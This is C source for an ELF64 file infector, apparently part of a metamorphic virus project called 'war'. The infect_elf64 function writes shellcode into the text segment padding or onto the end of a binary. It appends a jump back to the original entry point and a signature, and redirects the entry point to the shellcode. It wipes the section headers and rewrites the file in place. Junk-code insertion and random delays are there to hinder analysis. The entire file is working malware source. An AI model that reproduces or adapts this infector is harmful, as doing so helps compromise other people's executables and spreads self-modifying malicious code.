#include "../../include/war.h"
#include "../../include/metamorph_shellcode.h"
#include <errno.h>

// Debug macro para 64-bit
#ifdef DEBUG
#define DEBUG_PRINT_64(fmt, ...) fprintf(stderr, "[DEBUG-64] " fmt "\n", ##__VA_ARGS__)
#else
#define DEBUG_PRINT_64(fmt, ...) ((void)0)
#endif

static int write_infected_file(const char *filepath, void *data, size_t size)
{
	int fd;
	ssize_t written;
	struct stat st;
	mode_t original_mode = 0755;

	DEBUG_PRINT_64("write_infected_file: filepath=%s, size=%zu", filepath, size);

	if (stat(filepath, &st) == 0)
	{
		original_mode = st.st_mode;
		DEBUG_PRINT_64("  original_mode=0%o", original_mode);
	}

	// En Linux no puedes truncar un ejecutable mapeado, hay que borrarlo primero
	DEBUG_PRINT_64("  Unlinking old file...");
	(void)unlink(filepath);

	// Crear archivo nuevo con open() directamente
	fd = open(filepath, O_WRONLY | O_CREAT | O_TRUNC, original_mode);
	if (fd < 0)
	{
		DEBUG_PRINT_64("  ERROR: open failed, errno=%d", errno);
		return -1;
	}
	DEBUG_PRINT_64("  fd=%d opened successfully", fd);

	written = custom_write(fd, data, size);
	fchmod(fd, original_mode);
	custom_close(fd);

	if (written < 0 || (size_t)written != size)
	{
		DEBUG_PRINT_64("  ERROR: write failed, written=%zd, expected=%zu", written, size);
		return -1;
	}

	DEBUG_PRINT_64("  SUCCESS: wrote %zd bytes", written);
	return 0;
}

int infect_elf64(const char *filepath, t_config *config)
{
	t_elf elf = {0};
	void *new_data = NULL;
	size_t new_size;
	size_t original_size;
	Elf64_Ehdr *new_ehdr;
	Elf64_Phdr *new_phdr;
	Elf64_Shdr *new_shdr;
	int ret = -1;

	DEBUG_PRINT_64("========== infect_elf64 START ==========");
	DEBUG_PRINT_64("filepath: %s", filepath);

	if (!config->modify_signature)
	{
		DEBUG_PRINT_64("ERROR: modify_signature is disabled");
		return -1;
	}
	DEBUG_PRINT_64("modify_signature: enabled");

	insert_garbage();
	int order = get_execution_order();

	DEBUG_PRINT_64("Parsing ELF64...");
	if (order == 0 || order == 1)
	{
		if (parse_elf(filepath, &elf) < 0)
		{
			DEBUG_PRINT_64("ERROR: parse_elf failed (order 0-1)");
			return -1;
		}
		insert_garbage3();
	}
	if (order == 2 || order == 3)
	{
		if (parse_elf(filepath, &elf) < 0)
		{
			DEBUG_PRINT_64("ERROR: parse_elf failed (order 2-3)");
			return -1;
		}
		insert_garbage4();
	}
	insert_garbage4();

	DEBUG_PRINT_64("  ELF parsed successfully, size=%zu", elf.size);

	if (is_infected(&elf))
	{
		DEBUG_PRINT_64("  File already infected, skipping");
		cleanup_elf(&elf);
		return 0;
	}
	random_delay();

	original_size = elf.size;
	uint64_t original_entry = elf.ehdr->e_entry;

	DEBUG_PRINT_64("  original_size: %zu bytes", original_size);
	DEBUG_PRINT_64("  original_entry: 0x%lx", (unsigned long)original_entry);
	DEBUG_PRINT_64("  e_phnum: %d", elf.ehdr->e_phnum);

	// Find the executable PT_LOAD segment (TEXT) - mejor para inyección porque no tiene .bss
	Elf64_Phdr *phdr = (Elf64_Phdr *)((char *)elf.data + elf.ehdr->e_phoff);
	Elf64_Phdr *text_seg = NULL;
	size_t text_seg_idx = 0;

	DEBUG_PRINT_64("Searching for TEXT segment...");
	for (int i = 0; i < elf.ehdr->e_phnum; i++)
	{
		if (phdr[i].p_type == PT_LOAD)
		{
			DEBUG_PRINT_64("  PT_LOAD[%d]: offset=0x%lx vaddr=0x%lx filesz=0x%lx memsz=0x%lx flags=0x%x",
				i, (unsigned long)phdr[i].p_offset, (unsigned long)phdr[i].p_vaddr,
				(unsigned long)phdr[i].p_filesz, (unsigned long)phdr[i].p_memsz, phdr[i].p_flags);
			// Buscar el segmento ejecutable (TEXT) - tiene flag PF_X y filesz == memsz
			if ((phdr[i].p_flags & PF_X) && phdr[i].p_filesz == phdr[i].p_memsz)
			{
				text_seg = &phdr[i];
				text_seg_idx = i;
				DEBUG_PRINT_64("    -> Selected as TEXT segment");
			}
		}
	}

	if (!text_seg)
	{
		DEBUG_PRINT_64("ERROR: No suitable TEXT segment found");
		cleanup_elf(&elf);
		return -1;
	}

	// Calcular el padding disponible después del segmento TEXT
	size_t segment_file_end = text_seg->p_offset + text_seg->p_filesz;
	
	// Buscar el siguiente segmento para calcular el padding disponible
	size_t next_seg_offset = original_size; // Por defecto, fin del archivo
	for (int i = 0; i < elf.ehdr->e_phnum; i++) {
		if (phdr[i].p_offset > segment_file_end && phdr[i].p_offset < next_seg_offset) {
			next_seg_offset = phdr[i].p_offset;
		}
	}
	
	size_t available_padding = next_seg_offset - segment_file_end;

	DEBUG_PRINT_64("  segment_file_end: 0x%lx", (unsigned long)segment_file_end);
	DEBUG_PRINT_64("  next_seg_offset: 0x%lx", (unsigned long)next_seg_offset);
	DEBUG_PRINT_64("  available_padding: %zu bytes", available_padding);

	// El payload va al final del segmento TEXT, usando el padding existente
	size_t payload_file_offset = segment_file_end;
	
	// Para TEXT, filesz == memsz, así que la relación vaddr-offset es simple
	uint64_t vaddr_offset_diff = text_seg->p_vaddr - text_seg->p_offset;
	uint64_t payload_vaddr = payload_file_offset + vaddr_offset_diff;

	DEBUG_PRINT_64("  payload_file_offset: 0x%lx", (unsigned long)payload_file_offset);
	DEBUG_PRINT_64("  payload_vaddr: 0x%lx", (unsigned long)payload_vaddr);

	// Generate jump to original entry point
	unsigned char jmp_to_original[14];
	size_t jmp_size;

	uint64_t jmp_from = payload_vaddr + METAMORPH_SHELLCODE_SIZE;
	uint64_t jmp_to = original_entry;
	int64_t rel_offset = (int64_t)(jmp_to - (jmp_from + 5));

	DEBUG_PRINT_64("Generating JMP to original entry...");
	DEBUG_PRINT_64("  jmp_from: 0x%lx, jmp_to: 0x%lx", (unsigned long)jmp_from, (unsigned long)jmp_to);
	DEBUG_PRINT_64("  rel_offset: %ld", (long)rel_offset);

	if (rel_offset >= INT32_MIN && rel_offset <= INT32_MAX)
	{
		jmp_to_original[0] = 0xE9;
		*(int32_t *)(&jmp_to_original[1]) = (int32_t)rel_offset;
		jmp_size = 5;
		DEBUG_PRINT_64("  Using rel32 JMP (5 bytes)");
	}
	else
	{
		jmp_to_original[0] = 0xFF;
		jmp_to_original[1] = 0x25;
		*(uint32_t *)(&jmp_to_original[2]) = 0;
		*(uint64_t *)(&jmp_to_original[6]) = jmp_to;
		jmp_size = 14;
		DEBUG_PRINT_64("  Using abs64 JMP (14 bytes)");
	}

	// Get signature for injection (texto plano, visible con strings)
	const char *sig = get_signature();
	size_t sig_len = strlen(sig) + 1;

	// Calculate total injection size: shellcode + jump + signature
	size_t total_injection_size = METAMORPH_SHELLCODE_SIZE + jmp_size + sig_len;

	DEBUG_PRINT_64("Injection sizes:");
	DEBUG_PRINT_64("  shellcode: %d bytes", METAMORPH_SHELLCODE_SIZE);
	DEBUG_PRINT_64("  jmp: %zu bytes", jmp_size);
	DEBUG_PRINT_64("  signature: %zu bytes ('%s')", sig_len, sig);
	DEBUG_PRINT_64("  total: %zu bytes", total_injection_size);

	// Decidir estrategia: padding o extender archivo
	int use_padding = (total_injection_size <= available_padding);
	
	DEBUG_PRINT_64("Strategy: %s", use_padding ? "PADDING (use existing space)" : "EXTEND (append to file)");

	if (use_padding) {
		new_size = original_size;
	} else {
		// Inyectar al final del archivo, extendiendo el segmento TEXT
		payload_file_offset = original_size;
		payload_vaddr = payload_file_offset + vaddr_offset_diff;
		new_size = original_size + total_injection_size;
		
		DEBUG_PRINT_64("  Recalculating for file extension...");
		DEBUG_PRINT_64("  new payload_file_offset: 0x%lx", (unsigned long)payload_file_offset);
		DEBUG_PRINT_64("  new payload_vaddr: 0x%lx", (unsigned long)payload_vaddr);
		
		// Recalcular JMP con nueva posición
		jmp_from = payload_vaddr + METAMORPH_SHELLCODE_SIZE;
		rel_offset = (int64_t)(jmp_to - (jmp_from + 5));
		
		if (rel_offset >= INT32_MIN && rel_offset <= INT32_MAX) {
			jmp_to_original[0] = 0xE9;
			*(int32_t *)(&jmp_to_original[1]) = (int32_t)rel_offset;
			jmp_size = 5;
		} else {
			jmp_to_original[0] = 0xFF;
			jmp_to_original[1] = 0x25;
			*(uint32_t *)(&jmp_to_original[2]) = 0;
			*(uint64_t *)(&jmp_to_original[6]) = jmp_to;
			jmp_size = 14;
		}
	}

	DEBUG_PRINT_64("  new_size: %zu bytes", new_size);

	new_data = malloc(new_size);
	if (!new_data)
	{
		DEBUG_PRINT_64("ERROR: malloc failed for new_data");
		cleanup_elf(&elf);
		return -1;
	}

	insert_garbage5();

	DEBUG_PRINT_64("Copying and injecting...");

	// Copiar archivo original
	memcpy(new_data, elf.data, original_size);

	// Escribir shellcode en la posición calculada
	memcpy((char *)new_data + payload_file_offset, metamorph_shellcode, METAMORPH_SHELLCODE_SIZE);

	// PARCHE: Reemplazar el último byte del shellcode (ret = 0xc3) con NOP (0x90)
	unsigned char *shellcode_end = (unsigned char *)new_data + payload_file_offset + METAMORPH_SHELLCODE_SIZE - 1;
	if (*shellcode_end == 0xc3) {
		*shellcode_end = 0x90;
		DEBUG_PRINT_64("  Patched shellcode RET -> NOP");
	}

	// Escribir JMP
	memcpy((char *)new_data + payload_file_offset + METAMORPH_SHELLCODE_SIZE, jmp_to_original, jmp_size);

	// Sobrescribir con signature
	memcpy((char *)new_data + payload_file_offset + METAMORPH_SHELLCODE_SIZE + jmp_size, sig, sig_len);

	DEBUG_PRINT_64("  Shellcode injected at offset 0x%lx", (unsigned long)payload_file_offset);
	DEBUG_PRINT_64("  JMP injected at offset 0x%lx", (unsigned long)(payload_file_offset + METAMORPH_SHELLCODE_SIZE));
	DEBUG_PRINT_64("  Signature injected at offset 0x%lx", (unsigned long)(payload_file_offset + METAMORPH_SHELLCODE_SIZE + jmp_size));

	cleanup_elf(&elf);

	// Modify headers
	new_ehdr = (Elf64_Ehdr *)new_data;
	new_phdr = (Elf64_Phdr *)((char *)new_data + new_ehdr->e_phoff);
	// new_shdr ya no se usa porque invalidamos la section table
	(void)new_shdr; // Evitar warning de variable no usada

	// Change entry point to shellcode (+ offset de la función principal)
	uint64_t shellcode_entry = payload_vaddr + METAMORPH_ENTRY_OFFSET;
	new_ehdr->e_entry = shellcode_entry;

	DEBUG_PRINT_64("Modifying ELF headers...");
	DEBUG_PRINT_64("  new entry point: 0x%lx (offset %d into shellcode)", 
		(unsigned long)shellcode_entry, METAMORPH_ENTRY_OFFSET);

	// Extender filesz y memsz del segmento TEXT para incluir el payload
	if (use_padding) {
		// Solo extendemos por el tamaño de la inyección dentro del padding
		new_phdr[text_seg_idx].p_filesz += total_injection_size;
		new_phdr[text_seg_idx].p_memsz += total_injection_size;
		DEBUG_PRINT_64("  Extended TEXT segment by %zu bytes (padding)", total_injection_size);
	} else {
		// Extendemos hasta el final del archivo (incluyendo lo que había después del segmento)
		// Usamos new_phdr porque text_seg apuntaba a memoria ya liberada
		size_t extension = (payload_file_offset + total_injection_size) - 
		                   (new_phdr[text_seg_idx].p_offset + new_phdr[text_seg_idx].p_filesz);
		new_phdr[text_seg_idx].p_filesz += extension;
		new_phdr[text_seg_idx].p_memsz += extension;
		DEBUG_PRINT_64("  Extended TEXT segment by %zu bytes (file extension)", extension);
	}

	// TEXT ya es ejecutable, pero verificamos por si acaso
	if (!(new_phdr[text_seg_idx].p_flags & PF_X))
	{
		new_phdr[text_seg_idx].p_flags |= PF_X;
		DEBUG_PRINT_64("  Added PF_X flag to TEXT segment");
	}

	// IMPORTANTE: Invalidar section header table para evitar confusión del loader
	// El binario no necesita las secciones para ejecutarse, solo los program headers
	new_ehdr->e_shoff = 0;
	new_ehdr->e_shnum = 0;
	new_ehdr->e_shstrndx = 0;
	DEBUG_PRINT_64("  Section header table invalidated");

	insert_garbage5();

	DEBUG_PRINT_64("Writing infected file...");
	ret = write_infected_file(filepath, new_data, new_size);
	free(new_data);

	if (ret == 0) {
		DEBUG_PRINT_64("========== infect_elf64 SUCCESS ==========");
	} else {
		DEBUG_PRINT_64("========== infect_elf64 FAILED ==========");
	}

	return ret;
}